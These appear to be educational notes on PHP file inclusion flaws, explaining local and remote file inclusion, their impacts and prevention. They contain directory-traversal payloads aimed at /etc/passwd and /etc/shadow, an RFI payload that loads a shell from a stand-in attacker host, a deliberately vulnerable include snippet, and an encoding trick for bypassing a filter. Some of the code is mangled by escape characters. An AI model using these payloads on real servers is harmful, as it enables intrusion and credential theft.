**File Inclusion :**

* An application loads or includes files dynamically using user-controlled input without proper validation.
* Problem occurs when: user input is NOT validated, Attacker manipulates parameter.
* An application is vulnerable every time a developer uses the include functions, with an input provided by a user, without validating it.



**# Impacts of File inclusion attack:**

1\. code execution on server side

2\. code execution on client side

3\. DoS attack

4\. information disclosure



**# Types of File Inclusion:**

***1. Local file inclusion (LFI) :***

&#x20;occurs when an attacker tricks the application into loading local files from the server.

&#x20;syntax: anyparameter=somelocalfile

&#x20;example: http://172.30.124.12:9000/index.php?lang=/../../etc/passwd

&#x20;Common Files Targeted: /etc/passwd, /etc/shadow, /var/log/apache2/access.log



***2. Remote File Inclusion (RFI) :***

&#x20;occurs when an application includes files from external remote servers controlled by the attacker.

&#x20;Here attacker sends: malicious file which executes by server : ?page=http://attacker.com/shell.php

&#x20;anyparmeter=remoteweb.com/file

&#x20;example: target.com/index.php?share=http://facebook.com/status?id=12672



**# Prevention methods :**

Input validation, whitelisting allowed files, disabling remote file inclusion, proper file permissions, storing sensitive files outside the web root, and following secure coding practices.





**# Practical :**

1\. LFI:

* if target web server is reside on Linux Apache Platform
* DocumentRoot: ls /var/www/html/
* index.php trump.jpeg

\- server path will be /var/www/html/trump.jpeg

\- target.com/index.php?file=trump.jpeg

Example: any.com/index.php?file=../../../etc/passwd



Here is an example code of how a page could include PHP code, from a different file, inside the file that uses the include statement:



index.php:



``````````

<?php

$file = $\\\\\\\\\\\\\\\_GET\\\\\\\\\\\\\\\['lang'];

include('/var/www/html/' . $file)

?>





http://localhost:8080/index.php?lang=en.php



The attack:

application is detecting  in the lang parameter: $file=str\\\\\\\\\\\\\\\_replace('../','',$\\\\\\\\\\\\\\\_GET\\\\\\\\\\\\\\\['lang']);

\\\&#x09;					$file=str\\\\\\\\\\\\\\\_replace('./','',$file);





> URL Encoding of : ../../etc/passwd --> %2e%2e%2f%2e%2e%2fetc%2fpasswd







